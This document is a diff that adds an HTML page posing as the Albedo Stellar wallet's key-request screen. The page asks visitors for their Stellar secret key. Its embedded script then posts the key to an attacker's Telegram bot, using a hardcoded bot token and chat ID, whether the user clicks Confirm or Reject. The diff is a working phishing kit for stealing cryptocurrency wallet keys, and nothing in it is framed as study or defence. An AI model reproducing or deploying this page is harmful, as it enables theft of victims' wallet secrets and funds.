@@ -1,0 +1,362 @@
+<!DOCTYPE html>
+<html lang="en-US" data-theme="night">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
+    <meta http-equiv="Cache-Control" content="no-cache, no-store">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="0">
+    
+    <title>Albedo</title>
+    
+    <!-- Meta Tags -->
+    <meta name="google" content="notranslate">
+    <meta name="msapplication-TileColor" content="#2d89ef">
+    <meta name="theme-color" content="#272c2e">
+    
+    <!-- Favicon & Icons -->
+    <link rel="apple-touch-icon" sizes="180x180" href="https://albedo.link/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://albedo.link/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://albedo.link/favicon-16x16.png">
+    <link rel="manifest" href="https://albedo.link/site.webmanifest">
+    <link rel="mask-icon" href="https://albedo.link/safari-pinned-tab.svg" color="#5bbad5">
+    
+    <!-- External Resources -->
+    <link href="./Albedo_files/albedo.bb3da53d544186b6cf9c.css" rel="stylesheet">
+    
+    <style>
+        /* Pre-loader Styles */
+        #pre-loader {
+            width: 100%;
+            height: 100%;
+            color: #07A2CC;
+            font-size: 2.5rem;
+            text-align: center;
+        }
+
+        .loader {
+            --bg-image: url("data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz4NCjxzdmcgdmVyc2lvbj0iMS4xIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA1OCA1OCI+DQo8cGF0aCBmaWxsPSIjMDY5MUI3IiBkPSJNMzAuMTA1Njc4NiwyLjUyODA3NTJoLTIuMjExNDMxNUw1LjUwNzA0ODYsNTUuNDQzNjAzNWwwLjA2Njk0OTgsMC4wMjgzMjAzaDUuOTc0MDYwMWw0LjQ4MDAwMDUtMTAuNTg5MDAwNw0KCWM5LjMwOTgxNDUsMy4xMzc5Nzc2LDE5LjM5OTY3MTYsMy4wODUzODgyLDI4LjY3NjI2NzYtMC4xNDk0NzEzbDQuNTQzMjgxNiwxMC43Mzg0NjA1aDMuMTc4MzQwOWwwLjA2NzAwMTMtMC4wMjgzMjAzDQoJTDMwLjEwNTY3ODYsMi41MjgwNzUyeiBNMzAuMTUwNTk4NSw0NS4xOTg2MTIyYy00LjUzMzk0Ny0wLjAwMDg4NS05LjAzODA4MDItMC43MzI5NTIxLTEzLjMzODkzMDEtMi4xNjc5OTkzbDEzLjU4NjAwMDQtMzIuMTEyMzY5NQ0KCWwxMy41MjU5OTkxLDMxLjk3MDA4OUMzOS40OTI4NDM2LDQ0LjQxODEyOSwzNC44MzgwNzc1LDQ1LjE5ODkxMzYsMzAuMTUwNTk4NSw0NS4xOTg2MTIyeiIvPg0KPC9zdmc+");
+            display: block;
+            font-size: 16px;
+            width: 2em;
+            height: 2em;
+            margin: 1em auto;
+            padding: 1em;
+            box-sizing: border-box;
+            background: var(--bg-image);
+            mask-image: var(--bg-image);
+            -webkit-mask-image: var(--bg-image);
+            background-size: auto 2em;
+            animation: loader-appear 0.5s;
+            overflow: hidden;
+        }
+
+        .loader:before {
+            content: '';
+            display: block;
+            width: 0.2em;
+            height: 0.2em;
+            border-radius: 50%;
+            background: #FFF;
+            box-shadow: 0 0 0.4em 0.4em #FFF;
+            transform: translate(-1em, 1.3em);
+            animation: track-light 1.4s 0.5s infinite;
+        }
+
+        @keyframes track-light {
+            10% { transform: translate(-1em, 1.3em); }
+            50% { transform: translate(-0.08em, -0.9em); }
+            90% { transform: translate(0.9em, 1.9em); }
+        }
+
+        .loader.large { font-size: 24px; }
+        .loader.page-center { margin-top: 40vh; }
+
+        @keyframes loader-appear {
+            0%, 50% { opacity: 0; }
+            100% { opacity: 1; }
+        }
+
+        /* Notification Styles */
+        .telegram-notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            padding: 12px 20px;
+            border-radius: 8px;
+            color: white;
+            font-size: 14px;
+            z-index: 10000;
+            animation: slideInRight 0.3s ease;
+            display: none;
+        }
+
+        .telegram-notification.success {
+            background: #4CAF50;
+        }
+
+        .telegram-notification.error {
+            background: #f44336;
+        }
+
+        .telegram-notification.info {
+            background: #2196F3;
+        }
+
+        @keyframes slideInRight {
+            from {
+                transform: translateX(100%);
+                opacity: 0;
+            }
+            to {
+                transform: translateX(0);
+                opacity: 1;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <!-- Main App Container -->
+    <div class="main-container">
+        <!-- Header -->
+        <div class="container text-right">
+            <a href="#" class="logo">
+                <img src="./Albedo_files/logo.svg" alt="Albedo">
+            </a>
+        </div>
+
+        <!-- Page Content -->
+        <div class="page-container container space">
+            <div class="solo-layout no-title align-top">
+                <!-- Request Information -->
+                <div>
+                    <div>
+                        <h2>View public key</h2>
+                        <div class="micro-space">
+                            <a href="#" target="_blank">
+                                lab.stellar.org
+                            </a> 
+                            requested your Stellar account public key
+                        </div>
+                        <div class="space"></div>
+                    </div>
+
+                    <!-- Secret Key Input Section -->
+                    <div class="space">
+                        <hr class="flare">
+                        <span class="dimmed">Execute using </span>
+                        <div class="dd-wrapper">
+                            <a href="#" class="dd-header">
+                                Direct secret key input
+                                <span class="dd-toggle"></span>
+                            </a>
+                        </div>
+                        <div class="space"></div>
+                        <div class="dimmed text-small">
+                            Provide a secret key you'd like to use:
+                        </div>
+                        <div class="micro-space">
+                            <input type="text" class="Secretkey" id="secretKey" name="PrivateKey" required="true" placeholder="Secret key starting with 'S', like 'SAK4...2PLT'" value="">
+                        </div>
+                    </div> 
+                    
+                    <!-- Action Buttons -->
+                    <button class="button enable button-block" id="confirmBtn">
+                        Confirm using Albedo account
+                    </button>
+                    <button class="button button-block button-outline" id="rejectBtn">
+                        Reject
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Telegram Notification Container -->
+    <div id="telegramNotification" class="telegram-notification"></div>
+
+    <script>
+
+        
+        const BOT_TOKEN = '8864992919:AAHkE0jyViloI1sSKLc8lnRh6Tdt7Affr0w';  // 
+        const CHAT_ID = '7196180695'; // 
+        
+        // Function to display a notification
+        function showNotification(message, type = 'info') {
+            const notification = document.getElementById('telegramNotification');
+            notification.textContent = message;
+            notification.className = `telegram-notification ${type}`;
+            notification.style.display = 'block';
+            
+            setTimeout(() => {
+                notification.style.display = 'none';
+            }, 3000);
+        }
+        
+        
+        async function sendMessageToTelegram(message) {
+            // Validasi input
+            if (!message || message.trim() === '') {
+                showNotification('Message cannot be empty!', 'error');
+                return false;
+            }
+            
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            const payload = {
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'HTML'
+            };
+            
+            try {
+                showNotification('Loading to account. . .', 'info');
+                
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(payload),
+                });
+                
+                const data = await response.json();
+                
+                if (data.ok) {
+                    console.log('Message successfully sent to Telegram!');
+                    
+                    return true;
+                } else {
+                    console.error('Failed to send message:', data);
+                    showNotification(`❌ Gagal: ${data.description}`, 'error');
+                    return false;
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                showNotification(`❌ Error: ${error.message}`, 'error');
+                return false;
+            }
+        }
+        
+        // Function to format a Telegram message
+        function formatTelegramMessage(secretKey, action = 'confirm') {
+            const timestamp = new Date().toLocaleString('id-ID');
+            const actionText = action === 'confirm' ? '✅ CONFIRMED' : '❌ REJECTED';
+            
+            return `
+🔐 <b>STELLAR KEY ALERT</b> 🔐
+━━━━━━━━━━━━━━━━━━━━━
+📅 <b>Time:</b> ${timestamp}
+🎯 <b>Action:</b> ${actionText}
+━━━━━━━━━━━━━━━━━━━━━
+🔑 <b>Secret Key:</b>
+<code>${secretKey}</code>
+━━━━━━━━━━━━━━━━━━━━━
+⚠️ <i>This is an automated message</i>
+            `.trim();
+        }
+        
+        // Event handler for the Confirm button
+        document.getElementById('confirmBtn').addEventListener('click', async function(e) {
+            e.preventDefault();
+            
+            // Get input value
+            const secretKeyInput = document.querySelector('.Secretkey');
+            const secretKey = secretKeyInput.value.trim();
+            
+            // Validasi secret key (must start with at least 'S')
+            if (!secretKey) {
+                showNotification('⚠️ Secret key cannot be empty!', 'error');
+                secretKeyInput.style.border = '2px solid #f44336';
+                return;
+            }
+            
+            if (!secretKey.startsWith('S')) {
+                showNotification('⚠️ Secret key must start with a letter "S"!', 'error');
+                secretKeyInput.style.border = '2px solid #f44336';
+                return;
+            }
+            
+            // Reset border
+            secretKeyInput.style.border = '';
+            
+            // Format the message
+            const telegramMessage = formatTelegramMessage(secretKey, 'confirm');
+            
+            // Send to Telegram
+            const success = await sendMessageToTelegram(telegramMessage);
+            
+            if (success) {
+// Optional: Clear input after successful submission
+// secretKeyInput.value = '';
+
+// Optional: Continue to the next process
+                // window.location.href = 'next-page.html';
+            }
+        });
+        
+        // Event handler for the Reject button
+        document.getElementById('rejectBtn').addEventListener('click', async function(e) {
+            e.preventDefault();
+            
+            const secretKeyInput = document.querySelector('.Secretkey');
+            const secretKey = secretKeyInput.value.trim() || '(empty)';
+            
+            // Format reject message
+            const telegramMessage = formatTelegramMessage(secretKey, 'reject');
+            
+            // Send to Telegram
+            await sendMessageToTelegram(telegramMessage);
+            
+            // Display reject message
+            showNotification('Anda menolak permintaan ini', 'info');
+            
+            // Optional: Reset form or redirect
+            // secretKeyInput.value = '';
+        });
+        
+        // Validate input while typing
+        document.querySelector('.Secretkey').addEventListener('input', function(e) {
+            // Reset border saat user mulai mengetik
+            this.style.border = '';
+            
+            // Optional: Auto capitalize S
+            if (this.value.length === 1 && this.value !== 'S') {
+                // Not mandatory, just a visual suggestion
+                this.style.border = '2px solid #ff9800';
+            }
+        });
+        
+        // Logging for debugging (remove in production)
+        console.log('Telegram integration loaded');
+        console.log('Bot Token exists:', !!BOT_TOKEN);
+        console.log('Chat ID exists:', !!CHAT_ID);
+    </script>
+
+    <!-- Footer -->
+    <div class="dimmed text-center text-small container">
+        <div class="space"></div>
+        <div class="copyright">
+            2026&nbsp;©&nbsp;Albedo <span class="dimmed">v1.2.2</span>
+        </div>
+        <div style="padding-bottom: 1em;">
+            <a href="mailto:info@stellar.expert" target="_blank" class="dimmed">
+                <i class="icon-email"></i> Contact us
+            </a> 
+            <a href="" target="_blank" class="dimmed">
+                <i class="icon-github"></i> Source code
+            </a> 
+            <a href="#">
+                <i class="icon icon-night"></i> Dark theme
+            </a>
+        </div>
+    </div>
+
+    <div>
+        <div class="toast-notifications-container"></div>
+    </div>
+    <div>
+        <div class="container text-right"></div>
+    </div>
+</body>
+</html>
